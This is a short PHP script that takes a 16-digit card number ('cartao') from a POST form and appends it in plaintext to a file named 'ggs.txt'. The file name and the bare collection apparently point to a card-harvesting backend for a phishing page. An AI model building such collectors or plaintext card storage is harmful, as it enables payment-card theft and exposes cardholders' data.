<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cartao = trim($_POST['cartao']);
    if (preg_match('/^\d{16}$/', $cartao)) {
        file_put_contents('ggs.txt', $cartao . PHP_EOL, FILE_APPEND);
        echo 'OK';
    } else {
        http_response_code(400);
        echo 'Cartão inválido';
    }
}
?>
